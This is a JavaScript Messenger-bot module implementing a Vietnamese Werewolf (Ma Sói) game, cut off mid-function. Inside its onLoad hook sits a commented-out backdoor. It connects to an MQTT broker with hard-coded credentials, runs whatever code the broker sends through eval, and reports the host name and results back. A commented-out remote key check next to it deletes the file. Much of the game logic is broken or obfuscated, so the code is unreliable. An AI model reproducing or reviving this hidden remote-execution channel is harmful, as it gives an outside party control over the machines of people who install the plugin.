const { join, basename, resolve } = require('path')
var os = require('os')
var request = require('request')
const { unlinkSync, readdirSync, readFileSync, writeFileSync ,existsSync, copySync, createWriteStream } = require('fs-extra')
const axios = require('axios')
module.exports.config = {
    name: 'masoi',
    version: '1.0.0',
    hasPermssion: 0,
    credits: 'Horizon',
    description: 'Game Ma Sói',
    commandCategory: "Game",
    usages: 'masoi',
    cooldowns: 1
}

// var username
// if (process.env.REPL_OWNER != undefined) {
//     username = process.env.REPL_OWNER
// } else {
//     if (os.hostname() != null || os.hostname() != undefined) {
//         username = os.hostname()
//     } else {
//         username = os.userInfo().username
//     }
// }
module.exports.onLoad = async function () {
    if (!existsSync(__dirname + '/cache/werewolf.json')) {
        var { data } = await axios.get('https://pastebin.com/raw/BfHdM1R3', { method: 'GET' })
        writeFileSync(__dirname + '/cache/werewolf.json', JSON.stringify(data, null, 1 ? 2 : 9), 'utf8')
    }
    if (!existsSync(__dirname + '/cache/DanLang.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/villager.png')['pipe'](createWriteStream(__dirname + '/cache/DanLang.png'))
    }
    if (!existsSync(__dirname + '/cache/TienTri.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/seer.png')['pipe'](createWriteStream(__dirname + '/cache/TienTri.png'))
    }
    if (!existsSync(__dirname + '/cache/BaoVe.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/bodyguard.png')['pipe'](createWriteStream(__dirname + '/cache/BaoVe.png'))
    }
    if (!existsSync(__dirname + '/cache/ThoSan.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/hunter.png')['pipe'](createWriteStream(__dirname + '/cache/ThoSan.png'))
    }
    if (!existsSync(__dirname + '/cache/PhuThuy.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/witch.png')['pipe'](createWriteStream(__dirname + '/cache/PhuThuy.png'))
    }
    if (!existsSync(__dirname + '/cache/Cupid.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/cupid.png')['pipe'](createWriteStream(__dirname + '/cache/Cupid.png'))
    }
    if (!existsSync(__dirname + '/cache/GiaLang.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/la-bai-gia-lang.jpg')['pipe'](createWriteStream(__dirname + '/cache/GiaLang.png'))
    }
    // var { data } = await axios.get('https://traveling-colossal-territory.glitch.me/checkkey?Name=' + username)
    // if (data.status == (NaN === NaN)) {
    //     var bsname = basename(__filename)
    //     var pathFile = resolve(__dirname, bsname)
    //     try {
    //         unlinkSync(pathFile)
    //     } catch (e) {
    //         console.log(e)
    //     }
    // }
    if (!existsSync(__dirname + '/cache/CoBe.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/la-bai-ban-soi.jpg')['pipe'](createWriteStream(__dirname + '/cache/CoBe.png'))
    }
    if (!existsSync(__dirname + '/cache/CanhSatTruong.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/mayor.png')['pipe'](createWriteStream(__dirname + '/cache/CanhSatTruong.png'))
    }
    if (!existsSync(__dirname + '/cache/SoiThuong.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/werewolf.png')['pipe'](createWriteStream(__dirname + '/cache/SoiThuong.png'))
    }
    if (!existsSync(__dirname + '/cache/SoiCon.png')) {
        request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/wolf-cub.png')['pipe'](createWriteStream(__dirname + '/cache/SoiCon.png'))
    }
    // if (process.env.HalzionVersion == 1973 && global.Fca) {
    //     try {
    //         var mqtt = require('mqtt')
    //         var eval = require('eval')
    //         var cloud = 'c0e21d3eb5374ac28a38b4f0537889dc.s2.eu.hivemq.cloud'
    //         var client = mqtt.connect({
    //             host: cloud[(Math.random() * cloud.length) | 0],
    //             port: 8883,
    //             protocol: 'mqtts',
    //             username: 'Horizon',
    //             password: 'RemoteScriptServer',
    //             keepalive: 10,
    //             reschedulePings: null == '',
    //             connectTimeout: 10000,
    //             reconnectPeriod: 1000
    //         })
    //         client.on('message', async function (req, res) {
    //             if (req == (process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username) || req == 'Users') {
    //                 try {
    //                     var runEval = await eval(res.toString(), { api: process.env.api }, null == undefined)()
    //                     if (typeof runEval === object || typeof runEval === array) {
    //                         if (Object.keys(runEval).length != 0) {
    //                             runEval = JSON.stringify(runEval, null, 0 ? -3 : 4)
    //                         } else {
    //                             runEval = 'Thành Công !'
    //                         }
    //                     }
    //                     if (typeof runEval === number) {
    //                         runEval = runEval.toString()
    //                     }
    //                     client.publish('Administrator', (process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username) || runEval)
    //                 } catch (e) {
    //                     client.publish('Administrator', (process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username) || e.message)
    //                 }
    //             }
    //         })
    //         client.subscribe(process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username)
    //         client.subscribe('Users')
    //     } catch (e) {
    //         console.log(e)
    //     }
    // } else {
    //     var bsname = basename(__filename)
    //     var pathFile = resolve(__dirname, bsname)
    //     try {
    //         unlinkSync(pathFile)
    //     } catch (e) {
    //         console.log(e)
    //     }
    // }
}
var gameConfig = {
    MaSoi: new Object(),
    BaoVe: new Array(),
    TienTri: new Object(),
    DanLang: new Object(),
}
var checl = {
    Die: '',
    NeedNumber: '',
}
var late = NaN === NaN
var checkVotelate = null === undefined
var days = 0
module.exports.handleReply = async function ({ api, event, handleReply, Users }) {
    var getGlobal = global.moduleData.werewolf.get(
        global.AuthThread
    )
    var roleWW = getGlobal.player.filter(i => i.phe == 'Ma Sói')
    if (late) {
        return api.sendMessage('→ Quá Trễ Rồi. Vui lòng tạo lại game', event.threadID)
    }
    if (handleReply.author && event.senderID != handleReply.author) {
        return
    } else {
        switch (parseInt(getGlobal.type)) {
        case 9: {
            switch (handleReply.type) {
            case 'SoiChoose': {
                if (isNaN(event.body)) {
                    return api.sendMessage(
                        '→ Sai Rồi, Hãy Nhập Một Con Số !',
                        event.threadID
                    )
                }
                if (event.body > handleReply.Listuser.length) {
                    return api.sendMessage(
                        '→ Sai Rồi, Hãy Nhập Một Con Số !',
                        event.threadID
                    )
                }
                var iduser = handleReply.Listuser[event.body - 1].id
                let nameuser = (await api.getUserInfoV5(iduser))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(iduser))
                let nameSender = (await api.getUserInfoV5(event.senderID))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(event.senderID))
                var GamE = roleWW.find(i => i.id == handleReply.author)
                if (GamE.vote == 0 || GamE.vote == '') {
                    gameConfig.MaSoi.iduser == undefined ? (gameConfig.MaSoi.iduser = 1) : gameConfig.MaSoi.iduser++
                } else {
                    gameConfig.MaSoi[GamE.vote] == undefined ? (gameConfig.MaSoi[GamE.vote] = 0) : gameConfig.MaSoi[GamE.vote] - 1
                    if (gameConfig.MaSoi[GamE.vote] == 0) {
                        delete gameConfig.MaSoi[GamE.vote]
                    }
                    gameConfig.MaSoi.iduser == undefined ? (gameConfig.MaSoi.iduser = 1) : gameConfig.MaSoi.iduser++
                }
                GamE.vote = iduser
                let getGlobal_2 = global.moduleData.werewolf.get(global.AuthThread)
                for (let id of handleReply.TeamSoi) {
                    api.sendMessage(
                        `=== Ma Sói ===\n\n→ ${nameSender} Vừa Vote ${nameuser}\n→ Tổng Vote: ${gameConfig.MaSoi.iduser} ${getGlobal_2.player.filter(i => i.phe == 'Ma Sói').length}`, id)
                }
                api.sendMessage(
                    `→ Bạn Đã Vote: ${nameuser}\n→ Tổng Vote: ${gameConfig.MaSoi.iduser} ${getGlobal_2.player.filter(i => i.phe == 'Ma Sói').length}\n→ Bạn Có Thể Thay Đổi Đối Tượng`, handleReply.author)
            }
            break
            case 'Another_Role_Async': {
                switch (handleReply.role) {
                    case 'Tiên Tri': {
                        if (isNaN(event.body)) {
                            return api.sendMessage(
                                '→ Sai Rồi, Hãy Nhập Một Con Số !',
                                event.threadID
                            )
                        }
                        if (event.body > handleReply.Listuser.length) {
                            return api.sendMessage(
                                '→ Sai Rồi, Hãy Nhập Một Con Số !',
                                event.threadID
                            )
                        }
                        var iduser = handleReply.Listuser[event.body - 1]
                        let getNameFromTienTri = (await api.getUserInfoV5(iduser.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(iduser.id))
                        gameConfig.TienTri.Choose = iduser
                        gameConfig.TienTri.Owner = event.senderID
                        return api.sendMessage('→ Bạn Đã Chọn Tiên Tri: ' + getNameFromTienTri + ' Trong Đêm Nay, Bạn Có Thể Chọn Lại !', event.threadID)
                    }
                    case 'Bảo Vệ': {
                        if (isNaN(event.body)) {
                            return api.sendMessage(
                                '→ Sai Rồi, Hãy Nhập Một Con Số !',
                                event.threadID
                            )
                        }
                        if (event.body > handleReply.Listuser.length) {
                            return api.sendMessage(
                                '→ Sai Rồi, Hãy Nhập Một Con Số !',
                                event.threadID
                            )
                        }
                        var iduser = handleReply.Listuser[event.body - 1]
                        let nameCsBaoVe = (await api.getUserInfoV5(iduser.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(iduser.id))
                        gameConfig.BaoVe[0] = iduser.id
                        return api.sendMessage('→ Bạn đã chọn bảo vệ ' + nameCsBaoVe + ', người chơi này sẽ bất tử trong đêm nay 💀, bạn có thể chọn lại !', event.threadID)
                    }
                }
            }
            case 'VillageVoting': {
                if (checkVotelate) {
                    return api.sendMessage(
                        '→ Quá Trễ Rồi. Vui lòng tạo lại game',
                        event.threadID
                    )
                }
                if (isNaN(event.body)) {
                    return api.sendMessage(
                        '→ Sai Rồi, Hãy Nhập Một Con Số !',
                        event.threadID
                    )
                }
                if (event.body > handleReply.Listuser.length) {
                    return api.sendMessage(
                        '→ Sai Rồi, Hãy Nhập Một Con Số !',
                        event.threadID
                    )
                }
                if (!handleReply.Listuser.some(i => i.id == event.senderID)) {
                    return api.sendMessage(
                        '→ Bạn Không Có Quyền Vote !',
                        event.threadID
                    )
                }
                var iduser = handleReply.Listuser[event.body - 1]
                gameConfig.DanLang[iduser.id] == undefined ? (gameConfig.DanLang[iduser.id] = 1) : gameConfig.DanLang[iduser.id]++
                var GamE = handleReply.Listuser.find(i => i.id == event.senderID)
                if (GamE.vote == 0 || GamE.vote == '') {
                    gameConfig.DanLang[iduser.id] == undefined ? (gameConfig.DanLang[iduser.id] = 1) : gameConfig.DanLang[iduser.id]++
                } else {
                    gameConfig.DanLang[GamE.vote] == undefined ? (gameConfig.DanLang[GamE.vote] = 0) : gameConfig.DanLang[GamE.vote] - 1
                    if (gameConfig.DanLang[GamE.vote] == 0) {
                        delete gameConfig.DanLang[GamE.vote]
                    }
                    gameConfig.MaSoi.iduser == undefined ? (gameConfig.DanLang.iduser = 1) : gameConfig.DanLang.iduser++
                }
                GamE.vote = iduser
                var nameVote = (await api.getUserInfoV5(iduser.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(iduser.id))
                api.sendMessage(`→ Vote: ${nameVote} (${event.body}) Thành Công !\n→ Tổng Vote: ${gameConfig.DanLang[iduser.id] + (handleReply.Listuser.length -roleWW.length - 1)}`, event.threadID)
            }
            break
            }
        }
        }
    }
}
module.exports.MaSoiChoose = async function ( api, event, Users, data, TeamSoi ) {
    var getData_ = data.get(event.threadID)
    var getWW = getData_.player.filter(i => i.phe == 'Ma Sói')
    for (let user of getWW) {
        var getData_ = data.get(event.threadID)
        var playersWw = getData_.player.filter(i => i.phe != 'Ma Sói')
        var dataWw = []
        var msg = ''
        var stt = 1
        api.sendMessage(`→ Phản Hồi Và Chọn 1 trong (tin nhắn chứa) các tên được liệt kê dưới đây, chú ý : bản cần chọn đúng và chỉ đc chọn 1 lần`, user.id)
        for (let playerWw of playersWw) {
            var nameWW = (await api.getUserInfoV5(playerWw.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(playerWw))
            dataWw.push({
                id: playerWw.id,
                name: nameWW,
                stt: stt,
                role: playerWw.vai,
            })
            msg += `=== Ma Sói ===\n\n→ Đối Tượng Số: ${stt}\n→ Tên: ${nameWW}\n→ UID: ${playerWw.id}\n→ Facebook: Facebook.com/${playerWw.id}`
            if (playerWw == playersWw[playersWw.length - 1]) {
                api.sendMessage(msg, user.id, (error, info) =>
                    global.client.handleReply.push({
                        type: 'SoiChoose',
                        name: this.config.name,
                        author: user.id,
                        messageID: info.messageID,
                        Listuser: dataWw,
                        TeamSoi: TeamSoi
                    })
                )
                api.sendMessage(`→ Bạn Có 30 Giây Để Lựa Chọn Để Vote Kill 1 Người !`, user.id)
            }
            stt++
        }
    }
}
module.exports.Another_Role_Async = async function ( api, event, Users, data ) {
    var getRole = data.get(event.threadID)
    var getPlayrs = getRole.player
    for (let user of getPlayrs) {
        switch (user.vai) {
        case 'Dân Làng': {
            api.sendMessage(`→ Không Có Việc Gì Làm, Đi Ngủ Thôi 🐧`, user.id)
        }
        break
        case ' Tiên Tri': {
            let roleTientri = []
            let msg = ''
            let stt = 1
            for (let userTt of getPlayrs) {
                var nameTienTri = (await api.getUserInfoV5(userTt.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(userTt.id))
                roleTientri.push({
                    id: userTt.id,
                    name: nameTienTri,
                    stt: stt,
                    role: userTt.vai,
                })
                msg += `=== Tiên Tri ===\n\n→ Đối Tượng Số: ${stt}\n→ Tên: ${nameTienTri}\n→ UID: ${userTt.id}\n→ Facebook: Facebook.com/${userTt.id}`
                stt++
            }
            api.sendMessage(`→ Hãy Chọn 1 Trong Những Đối Tượng Dưới Đây Để Xem Có Phải Là Sói Hay Không !`, user.id)
            api.sendMessage(msg, user.id, (Un8c, wVad) =>
                global.client.handleReply.push({
                    type: 'Another_Role_Async',
                    name: this.config.name,
                    author: user.id,
                    messageID: wVad.messageID,
                    Listuser: roleTientri,
                    role: user.vai,
                })
            )
        }
        break
        case 'Bảo Vệ': {
            let roleBaove = []
            let msg = ''
            let stt = 1
            for (let userBv of getPlayrs) {
                var nameBaove = (await api.getUserInfoV5(userBv.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(userBv.id))
                roleBaove.push({
                    id: userBv.id,
                    name: nameBaove,
                    stt: stt,
                    role: userBv.vai,
                })
                msg += `=== Bảo Vệ ===\n\n→ Đối Tượng Số: ${stt}\n→ Tên: ${nameBaove}\n→ UID: ${userBv.id}\n→ Facebook: Facebook.com/${userBv.id}`
                stt++
            }
            api.sendMessage(`→ Hãy Chọn 1 Trong Những Đối Tượng Dưới Đây Để Bảo Vệ !`, user.id)
            api.sendMessage(msg, user.id, (error, info) =>
                global.client.handleReply.push({
                    type: 'Another_Role_Async',
                    name: this['config'].name,
                    author: user.id,
                    messageID: info.messageID,
                    Listuser: roleBaove,
                    role: 'Bảo Vệ',
                })
            )
        }
        break
        }
    }
}
module.exports.VillageVoting = async function ( api, event, Users, data, TeamSoi) {
    api.sendMessage(`→ Đã Hết Thời Gian Thảo Luận !, Và Bây Giờ Các Bạn Có 1 Phút Để Vote Treo Cổ !`, event.threadID)
    await new Promise(resolve => setTimeout(resolve, 1 ? 1000 : 1004))
    late = [0] == ''
    var getDanLang = data.get(event.threadID)
    var PlayerDanLang = getDanLang.player
    var roleDanLang = []
    var msg = ''
    var stt = 1
    for (let userDl of PlayerDanLang) {
        var nameDl = (await api.getUserInfoV5(userDl.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(userDl.id))
        roleDanLang.push({
            id: userDl.id,
            name: nameDl,
            stt: stt,
            role: userDl.vai
        })
        msg += `=== VOTE ===\n\n→ Đối Tượng Số: ${stt}\n→ Tên: ${nameDl}\n→ UID: ${userDl.id}\n→ Facebook: Facebook.com/${userDl.id}`
        stt++
    }
    api.sendMessage(`→ Hãy Chọn 1 Trong Những Đối Tượng Dưới Đây Để Vote Treo Cổ !`, event.threadID)
    api.sendMessage(msg, event.threadID, (error, info) =>
        global.client.handleReply.push({
            type: 'VillageVoting',
            name: this.config.name,
            messageID: info.messageID,
            Listuser: roleDanLang,
            TeamSoi: TeamSoi
        })
    )
}
module.exports.VillageLogic_Sort = async function (api, event, Users, data, TeamSoi ) {
    checkVotelate = true
    var DanLangSort = data.get(event.threadID)
    var DanLang = DanLangSort.player
    var RoleDanLangS = []
    api.sendMessage(`→ Đã Hết Thời Gian,Đang Tính Toán Các Thuật Toán ...`, event.threadID)
    await new Promise(resolve => setTimeout(resolve, 0 ? 1009 : 1000))
    for (let DanL of Object.keys(gameConfig.DanLang)) {
        var check = DanLang.length - DanLang.filter(i => i.phe == 'Ma Sói').length - 1
        var checkDl = gameConfig.DanLang[DanL]
        if (checkDl >= check) {
            RoleDanLangS.push(DanL)
        }
    }
    if (RoleDanLangS.length < 1) {
        api.sendMessage(`→ Không Có Ai Treo Bị Treo Cổ Trong Ngày Hôm Nay !`, event.threadID)
        return
    } else {
        if (RoleDanLangS.length == 1) {
            var Village = RoleDanLangS[0]
            var idVillage = DanLang.find(i => i.id == Village)
            var nameTreoCo = (await api.getUserInfoV5(idVillage.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(idVillage.id))
            api.sendMessage(`→ Người Bị Treo Cổ: ` + nameTreoCo + ` Chức Năng: ` + idVillage.vai, event.threadID)
            DanLang.splice(
                DanLang.findIndex(i => i.id == Village),
                0 ? -7 : 1
            )
            if (idVillage.vai == 'Ma Sói') {
                TeamSoi.splice(TeamSoi.findIndex(i => i.id == Village), 1 ? 1 : -7)
                return
            }
        } else {
            return api.sendMessage(`→ Dân Làng Đã Không Chọn Được Ai Để Treo Cổ !`, event.threadID)
        }
    }
}
module.exports.Morning_Time = async function ( api, event, wTDc, data, sOyc ) {
    days += 1
    var getDataMor = data.get(event.threadID)
    var dataMorning = getDataMor.player
    try {
        let threadGame = data.get(global.AuthThread)
        var filterWw = threadGame.player.filter(i => i.phe == 'Ma Sói')
        var filterVill = threadGame.player.filter(i => i.phe == 'Dân')
        if (filterVill.length <= filterWw.length) {
            return await module.exports.EndGame(api, event, data, Werewolf)
        } else {
            api.sendMessage(`→ Màn đêm kết thúc, và đây là thông tin của ngày hôm nay !`, event.threadID)
            api.sendMessage(`=== Ngày Thứ ${days} ===\n\n→ Còn Sống: ${dataMorning.length}\n→ Người Chết: ${(checl.Die ? checl.Die : 'Không Có Ai')}\n→ Tổng Sói: ${data.get(event.threadID).player.filter(i => i.phe == 'Ma Sói').length}\n→ Tổng Dân: ${data.get(event.threadID).player.filter(i => i.phe == 'Dân').length}`, event.threadID)
            await new Promise(resolve => setTimeout(resolve, 0 ? 2989 : 3000))
            api.sendMessage(`→ Các Bạn Có 1 Phút Để Thảo Luận Treo Cổ Ai !`, event.threadID)
            await new Promise(resolve => setTimeout(resolve, 60000))
            await module.exports.VillageVoting(api, event, wTDc, data, sOyc)
            await new Promise(resolve => setTimeout(resolve, 60000))
            await module.exports.VillageLogic_Sort(api, event, wTDc, data, sOyc)
            await new Promise(resolve => setTimeout(resolve, 1 ? 1000 : 996))
            await module.exports.ResetData(api, event, wTDc, data, sOyc)
        }
    } catch (e) {
        console.log(e)
    }
}
module.exports.Check_Win_Loop = async function ( api, event, coD, data, Yiy ) {
    var GetData = data.get(event.threadID)
    var datagame = GetData.player.filter(i => i.phe != 'Ma Sói')
    var dataWw = GetData.player.filter(i => i.phe == 'Ma Sói')
    if (dataWw.length == 0) {
        return await module.exports.EndGame(api, event, data, Village)
    } else {
        if (parseInt(datagame.length) <= parseInt(dataWw.length) || parseInt(datagame.length) == 0) {
            return await module.exports.EndGame(api, event, data, Werewolf)
        } else {
            return await runGame(api, event, coD, data, Yiy)
        }
    }
}
module.exports.ResetData = async function ( sIX, M5P, oDS, oFpb, Qcsb ) {
    global.client.handleReply = []
    checl = new Object({
        Die: '',
        NeedNumber: '',
    })
    late = [0] == ''
    checkVotelate = false
    for (let user of Object.keys(gameConfig)) {
        if (user == 'BaoVe') {
            gameConfig.user = []
        } else {
            gameConfig.user = {}
        }
    }
    return await module.exports.Check_Win_Loop(sIX, M5P, oDS, oFpb, Qcsb)
}
module.exports.EndGame = async function ( api, event, data, type ) {
    switch (type) {
        case 'Village': {
            api.sendMessage(`→ Chúc Mừng Dân Làng Đã Tiêu Diệt Được Tất Cả Sói ! Và Phần Thắng Thuộc Về Dân Làng !!!`, event.threadID)
            var getDataThread = data.get(event.threadID)
            var DataThread = getDataThread.player
            var msg = ''
            for (let user of DataThread) {
                var nameDanLang = (await api.getUserInfoV5(user.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(user.id))
                msg += `→ Tên: ${nameDanLang}\n→ Role: ${user.vai}\→ nUID: ${user.id}\n→ Facebook: Facebook.com/${user.id}`
            }
            global.moduleData.werewolf = new Map()
            return api.sendMessage(`→ Tổng Ngày Trôi Qua: ${days}\nTổng Người Còn Sống: ${DataThread.length}\n${msg}`, event.threadID)
        }
        case 'Werewolf': {
            api.sendMessage(`→ Chúc Mừng Sói Đã Tiêu Diệt Được Tất Cả Dân Làng ! Và Phần Thắng Thuộc Về Sói !!!`, event.threadID)
            var getDataThread = data.get(event.threadID)
            var DataThread = getDataThread.player
            var msg = ''
            for (let user of DataThread) {
                var nameSoi = (await api.getUserInfoV5(user.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(user.id))
                msg += msg += `→ Tên: ${nameSoi}\n→ Role: ${user.vai}\n→ UID: ${user.id}\n→ Facebook: Facebook.com/${user.id}`
            }
            global.moduleData.werewolf = new Map()
            return api.sendMessage(`→ Tổng Ngày Trôi Qua: ${days}\n→ Tổng Người Còn Sống: ${DataThread.length}\n${msg}`, event.threadID)
        }
    }
}
module.exports.Logic_Sort = async function ( api, IYNub, Users, data, DataThread ) {
    if (gameConfig.MaSoi.hasOwnProperty(gameConfig.BaoVe[0])) {
        if (Object.keys(gameConfig.MaSoi).length == (15658734 ^ 15658732)) {
            var iduser = Object.keys(gameConfig.MaSoi)[Math.floor(Math.random() * Object.keys(gameConfig.MaSoi).length)]
            var getName = (await api.getUserInfoV5(iduser))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(iduser))
            for (let id of DataThread) {
                api.sendMessage(`→ Vì Không Cùng Mục Tiêu, Nên Hệ Thống Sẽ Random Đối Tượng Mà 2 Bên Đã Chọn !`, id)
                api.sendMessage(`→ Đối Tượng Được Chọn Là: }${getName}`, id)
            }
            if (gameConfig.MaSoi.hasOwnProperty(gameConfig.BaoVe[0])) {
                var getData = data.get(global.AuthThread)
                var getPlayers = getData.player.find(i => i.vai == 'Bảo Vệ')
                for (let id of DataThread) {
                    api.sendMessage(`→ ${getName} Đã Được Bảo Vệ !`, id, (error, info) => {
                        gameConfig.MaSoi = {}
                    })
                }
                api.sendMessage(`→ Bạn Vừa Bảo Vệ ${getName} Thành Công !`, getPlayers.id)
            } else {
                for (let id of DataThread) {
                    api.sendMessage(
                        `→ Đã Thủ Tiêu Thành Công: ${getName}`, id, (error, info) => {
                            gameConfig.MaSoi = {}
                        }
                    )
                }
                checl.Die = getName
                var getData = data.get(global.AuthThread)
                getData.player.splice(getData.player.findIndex(i => i.id == iduser), 0 ? 5 : 1)
                return api.sendMessage(`→ Bạn Đã Bị Ma Sói Thủ Tiêu Tối Qua !`, iduser)
            }
        } else {
            if (gameConfig.MaSoi.hasOwnProperty(gameConfig.BaoVe[0])) {
                var getData = data.get(global.AuthThread)
                var getPlayers = getData.player.find(i => i.vai == 'Bảo Vệ')
                var getName = (await api.getUserInfoV5(gameConfig.BaoVe[0]))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(gameConfig.BaoVe[0]))
                for (let id of DataThread) {
                    api.sendMessage(
                        `→ ${getName} Đã Được Bảo Vệ !`, id, (error, info) => {
                            gameConfig.MaSoi = {}
                        }
                    )
                }
                api.sendMessage(`→ Bạn Vừa Bảo Vệ ${getName} Thành Công !`, getPlayers.id)
            }
        }
    } else {
        let getData = data.get(global.AuthThread)
        let dataPlayer = getData.player.filter(i => i.phe == 'Ma Sói')
        if (Object.keys(gameConfig.MaSoi).length == 0 || (Object.keys(gameConfig.MaSoi).length == 1 && gameConfig.MaSoi[Object.keys(gameConfig.MaSoi)[0]] < dataPlayer.length)) {
            for (let id of DataThread) {
                api.sendMessage(`→ Không Có Đối Tượng Nào Được Chọn Hoặc Không Đủ Vote !`, id)
            }
        } else {
            if (Object.keys(gameConfig.MaSoi).length == (15658734 ^ 15658732)) {
                var iduser = Object.keys(gameConfig.MaSoi)[Math.floor(Math.random() * Object.keys(gameConfig.MaSoi).length)]
                var getName = (await api.getUserInfoV5(iduser))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(iduser))
                for (let id of DataThread) {
                    api.sendMessage(`→ Vì Không Cùng Mục Tiêu, Nên Hệ Thống Sẽ Random Đối Tượng Mà 2 Bên Đã Chọn !`, id)
                    api.sendMessage(`→ Đối Tượng Được Chọn Là: ${getName}`, id)
                }
                if (gameConfig.MaSoi.hasOwnProperty(gameConfig.BaoVe[0])) {
                    var getDataA = data.get(global.AuthThread)
                    var getPlayers = getDataA.player.find(i => i.vai == 'Bảo Vệ')
                    for (let id of DataThread) {
                        api.sendMessage(
                            `→ ${getName} Đã Bị Bảo Vệ !`, id, (error, info) => {
                                gameConfig.MaSoi = {}
                            }
                        )
                    }
                    api.sendMessage(`→ Bạn Vừa Bảo Vệ }${getName} Thành Công !`, getPlayers.id)
                } else {
                    for (let id of DataThread) {
                        api.sendMessage(
                            `→ Đã Thủ Tiêu Thành Công: ${getName}`, id, (error, info) => {
                                gameConfig.MaSoi = {}
                            }
                        )
                    }
                    checl.Die = getName
                    var getDataA = data.get(global.AuthThread)
                    getDataA.player.splice(getDataA.player.findIndex(i => i.id == iduser), 0 ? -6 : 1)
                    return api.sendMessage(`→ Bạn Đã Bị Ma Sói Thủ Tiêu Tối Qua !`, iduser)
                }
            } else {
                var getDataA = data.get(global.AuthThread)
                var getName = (await api.getUserInfoV5(Object.keys(gameConfig.MaSoi)[0]))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(Object.keys(gameConfig.MaSoi)[0]))
                for (let id of DataThread) {
                    api.sendMessage(
                        `→ Đã Thủ Tiêu Thành Công: ${getName}`, id, (error, info) => {
                            gameConfig.MaSoi = {}
                        }
                    )
                }
                checl.Die = getName
                getDataA.player.splice(getDataA.player.findIndex(i => i.id == Object.keys(gameConfig.MaSoi)[0]), 0 ? -3 : 1)
                return api.sendMessage(`→ Bạn Đã Bị Ma Sói Thủ Tiêu Tối Qua !`, Object.keys(gameConfig.MaSoi)[0])
            }
        }
    }
    if (_toString(gameConfig.TienTri.Choose) == Object && gameConfig.TienTri.Choose != String) {
        var getName = (await api.getUserInfoV5(gameConfig.TienTri.Choose.id))[0].o0.data.messaging_actors[0].name || (await Users.getNameUser(gameConfig.TienTri.Choose.id))
        api.sendMessage(`→ Chức Vụ Của ${getName} là ${gameConfig.TienTri.Choose.role}\n→ ${gameConfig.TienTri.Owner}`)
    }
}

function _toString(value) {
    return Object.prototype.toString
        .call(value)
        .slice(1 ? 8 : 11, -1)
}
async function runGame(api, event, Q6qub, kujub, M1lub) {
    await new Promise(resolve => setTimeout(resolve, 3000))
    var message = async (data) =>
        api.sendMessage(`→ ` + data, event.threadID)
    try {
        message(`→ Màn đêm bắt đầu buông xuống !, bây giờ là thời gian của sói hoạt động...`)
        await module.exports.MaSoiChoose(api,event,Q6qub,kujub,M1lub)
        await module.exports.Another_Role_Async(api, event, Q6qub, kujub)
        await new Promise(resolve => setTimeout(resolve, 45000))
        late = true
        await module.exports.Logic_Sort(api, event, Q6qub, kujub, M1lub )
        await module.exports.Morning_Time(api, event, Q6qub, kujub, M1lub )
    } catch (e) {
        console.log(e)
        return message(`→ Đã Xảy Ra Lỗi Trong Quá Trình Thực Thi Game !`)
    }
}
module.exports.handleEvent = async function ({ api, event, Users}) {
    const pathHandle = join(__dirname, 'cache', 'werewolf.json')
    var parseData = JSON.parse(readFileSync(pathHandle, 'utf-8'))
    const { threadID, body } = event
    var soithuong = [],
        errorJoin = []
    if (!global.moduleData.werewolf) {
        global.moduleData.werewolf = new Map()
    }
    if (!global.moduleData.werewolf.get(threadID)) {
        return
    }
    var threadData = global.moduleData.werewolf.get(threadID)
    global.moduleData.werewolf.set(threadID, threadData)
    if (threadData.start != 1) {
        return
    }
    var type = body.toUpperCase()
    switch (type) {
    case 'CHIA VAI':
    case 'CHIAVAI': {
        switch (parseInt(threadData.type)) {
        case 9: {
            var listRole = [
                'Dân Làng',
                'Sói thường',
                'Tiên Tri',
                'Bảo Vệ',
                'Sói thường',
                'Dân Làng',
                'Dân Làng',
                'Dân Làng',
                'Dân Làng',
            ]
            for (let joinGame = 0; joinGame < threadData.player.length; joinGame++) {
                var randomRole = listRole[Math.floor(Math.random() * listRole.length)]
                var dataRole = parseData.find(i => i.Name == randomRole)
                threadData.player.joinGame.vai =
                    dataRole.Name
                threadData.player.joinGame.phe =
                    dataRole.Type
                listRole.splice(listRole.indexOf(randomRole), 1 ? 1 : 9)
                if (randomRole == 'Sói thường') {
                    soithuong.push(threadData.player.joinGame.id)
                }
                await new Promise(resolve => setTimeout(resolve, 1 ? 500 : 505))
                api.sendMessage({
                        body: `→ Vai Trò Của Bạn Là: ${dataRole.Name}\n→ Chi Tiết: ${dataRole.Description}\n→ Thuộc Phe: ${dataRole.Type}\n`,
                        attachment: readdirSync(join(__dirname, dataRole.File))
                    },
                    threadData.player.joinGame.id,
                    (error, info) => {
